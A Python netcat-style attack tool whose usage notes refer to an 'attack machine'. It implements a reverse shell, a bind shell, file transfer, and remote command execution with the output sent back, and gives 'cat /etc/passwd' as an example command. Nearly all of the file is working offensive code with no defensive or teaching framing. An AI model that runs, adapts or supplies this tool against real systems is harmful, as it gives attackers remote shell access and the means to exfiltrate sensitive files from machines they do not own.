
#### USAGE:
## Give a reverse shell to attack machine
# nc.py -t 192.168.1.108 -p 6666 -r
## Give a bind shell on target machine.
# nc.py -t 192.168.1.108 -p 6666 -b
## Accept uploaded file from attack machine
# netcat.py -t 192.168.1.108 -p 6666  -u mytest.txt
## Download a file from a TCP server
# nc.py -t 192.168.1.108 -p 6666 -d mytest.txt
## Execute command on target and transfer the result to attack machine
# nc.py -t 192.168.1.108 -p 5555 -e "cat /etc/passwd"
## Connect to attack machine.
# nc.py -t 192.168.1.108 -p 5555


import argparse
import socket
import shlex
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument('-t', nargs='?',type=str,help='host')
parser.add_argument('-p', nargs='?', type=int, help='port')
parser.add_argument('-e', nargs='?',type=str, help='Execute command and transfer the result')
parser.add_argument('-u', nargs='?',type=str, help='Accept uploaded file from attack machine')
parser.add_argument('-r', action='store_true', help='Reverse command shell')
parser.add_argument('-b', action='store_true', help='Bind command shell')
parser.add_argument('-d', nargs='?',type=str, help='Download file from attack machine')

opt = parser.parse_args()

######### Listen and Send ############

# Bind local IP and port
def listen(ip,port):
    # Listening socket
    ip = str(ip)
    ip_port = (ip, port)
    # Create a server and start listening
    server = socket.socket()
    server.bind(ip_port)
    server.listen()
    print(f'[*] Listening at {ip_port}')
    s, raddr = server.accept()
    print(f'[*] Connecting with {raddr}')
    return s, raddr

# Create socket and connection with remote host
def send():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    return s

########## shell, command excution #############

# Execute a command on target and return the result.
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    result = (result.decode())
    return result

# Create a shell
def shell_cmd(s):
   while True:
      s.send(b"#> ")
      cmd = s.recv(1024).decode() # receive command instruction from attack host.
      result = execute(cmd)
      s.send(result.encode())

############### upload_download_file #################

### Act as a server, accept file from a TCP client ####
## Client side: nc 127.0.0.1 6666 < out.txt
## Server side: nc -lvnp 6666

def upload(s,raddr,file_name):
    print(f'[*] Uploading file from:{raddr}')
    buf = b''
    while True:
       data = s.recv(1024)
       if data:
          buf += data
       else:
          f = open(file_name,'wb')
          f.write(buf)
          f.close()
          print(f'[*] Finished uploading file from:{raddr}')
          break

### Act as a client, download a file from a TCP server ###
## Server side: nc -lvnp 6666 < out.txt
## Client side: nc 120.0.0.1 6666

def download(ip,port,file_name):
    client = send()
    raddr = (ip,port)
    print(f'[*] Downloading file from:{raddr}')
    buf = b''
    while True:
       data = client.recv(1024)
       if data:
          buf += data
       else:
          f = open(file_name,'wb')
          f.write(buf)
          f.close()
          print(f'[*] Finished Downloading file from:{raddr}')
          break

################### main ##################################

if opt.t and opt.p:
     port = opt.p
     ip =opt.t
else:
    print("Error: option -t and -p must be provided")
    exit(1)

## Reverse shell with -r, -t, -p options
if opt.r:
    cmd = '/bin/bash'
    s = send()
    shell_cmd(s)
## Bind shell with -b, -t -p options
elif opt.b:
    s, raddr = listen(ip, port)
    shell_cmd(s)
## Excute command and trensfter the result to attack machine
elif opt.e:
    cmd = opt.e
    s = send()
    result = execute(cmd)
    s.send(result.encode())
## Upload file with -u, -t,-p options
elif opt.u:
    s, raddr = listen(ip, port)
    file_name = opt.u
    upload(s,raddr,file_name)
## Download file with -d, -t, -p options
elif opt.d:
    file_name = opt.d
    download(ip,port,file_name)
## Connect a TCP server with -t, -p options
else:
    client = send()
    while True:
         request = input('')
         client.send(request.encode())
         response = client.recv(1024)
         print(response.decode())






































